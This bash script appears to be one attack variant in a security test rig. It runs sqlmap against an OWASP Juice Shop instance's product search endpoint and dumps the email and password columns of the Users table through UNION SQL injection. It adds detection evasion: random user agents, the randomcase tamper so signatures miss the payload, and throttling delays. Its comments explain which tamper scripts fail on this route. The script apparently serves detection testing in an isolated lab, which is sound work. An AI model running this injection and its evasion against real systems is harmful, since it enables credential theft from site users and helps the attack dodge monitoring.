#!/usr/bin/env bash
# ATK-08 variant b: low and slow, and quiet. The same sqlmap UNION dump of Users through search as
# ATK-08.a, but with a random browser user agent (--random-agent), the randomcase tamper script
# (`UnIoN SeLeCt`, so case-sensitive SQLi signatures miss it) and --delay so the whole dump of every
# customer takes 2-3 minutes (D-35). Tampers that change whitespace don't work on this route:
# space2comment's /**/ makes payloads longer than the 200 characters Juice Shop keeps of q, and with
# space2randomblank sqlmap finds no injection at all. Runs inside the rig's tools container only.
# tool: sqlmap 1.10.11
# label: quiet: sqlmap UNION dump with --random-agent, randomcase and --delay
set -eu
sqlmap -u 'http://10.66.0.10/rest/products/search?q=apple' -p q \
  --dbms=sqlite --technique=U --prefix="'))" --suffix='--' --no-cast --batch --answers='crack=N' \
  --random-agent --tamper=randomcase --delay=0.36 -T Users -C email,password --dump \
  -t /out/traffic.txt --output-dir=/out/sqlmap
